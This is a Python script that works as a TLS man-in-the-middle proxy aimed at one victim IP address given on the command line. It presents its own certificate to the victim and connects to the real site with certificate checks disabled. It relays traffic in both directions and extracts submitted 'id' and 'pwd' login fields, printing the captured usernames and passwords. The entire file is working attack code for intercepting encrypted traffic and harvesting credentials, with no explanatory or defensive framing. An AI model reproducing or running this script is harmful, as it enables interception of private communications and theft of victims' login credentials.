#!/usr/bin/env python3
import socket
import ssl
import threading
import re, sys

victim_ip = sys.argv[1]
victim_interface = sys.argv[2]

MITM_HOST = "0.0.0.0"
MITM_PORT = 8080

CERT_FILE = "../certificates/host.crt"
KEY_FILE = "../certificates/host.key"


def handle_client(client_conn, client_addr):
    context_client = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context_client.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
    context_client.minimum_version = ssl.TLSVersion.TLSv1_2
    context_client.maximum_version = ssl.TLSVersion.TLSv1_2
    context_client.options |= ssl.OP_NO_TLSv1
    context_client.options |= ssl.OP_NO_TLSv1_1
    tls_client_conn = context_client.wrap_socket(client_conn, server_side=True)


    request_data = tls_client_conn.recv(4096)
    match = re.search(rb"Host: ([^\r\n]+)", request_data)
    if not match:
        tls_client_conn.close()
        return

    victim_host = match.group(1).decode()

    try:
        host_ip = socket.gethostbyname(victim_host)
        server_conn = socket.create_connection((victim_host, 443))
        context_server = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context_server.minimum_version = ssl.TLSVersion.TLSv1_2
        context_server.maximum_version = ssl.TLSVersion.TLSv1_2
        context_server.options |= ssl.OP_NO_TLSv1
        context_server.options |= ssl.OP_NO_TLSv1_1
        context_server.check_hostname = False
        context_server.verify_mode = ssl.CERT_NONE
        tls_server_conn = context_server.wrap_socket(server_conn, server_hostname=victim_host)
        print("TLS Connection Established : [{}:443]".format(host_ip))
    except Exception as e:
        print(f"Error: {e}")
        tls_client_conn.close()
        return

    tls_server_conn.sendall(request_data)

    def forward(source, destination):
        try:
            while True:
                data = source.recv(4096)
                if not data:
                    break
                idpwd = re.search(rb"^id=([^\r\n]+)&pwd=([^\r\n]+)&recaptcha",data)
                if idpwd:
                    id = idpwd.group(1).decode()
                    pwd = idpwd.group(2).decode()
                    print("id: "+ id +", password: " + pwd)
                destination.sendall(data)
        except Exception as e:
            print(f"Error: {e}")
        finally:
            try:
                source.close()
            except:
                pass
            try:
                destination.close()
            except:
                pass
        
    threading.Thread(target=forward, args=(tls_client_conn, tls_server_conn), daemon=True).start()
    threading.Thread(target=forward, args=(tls_server_conn, tls_client_conn), daemon=True).start()


def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((MITM_HOST, MITM_PORT))
    server.listen(5)

    while True:
        client_socket, client_addr = server.accept()
        if client_addr[0] == victim_ip:
            threading.Thread(target=handle_client, args=(client_socket,client_addr), daemon=True).start()
        else:
            client_socket.close()


if __name__ == "__main__":
    start_server()
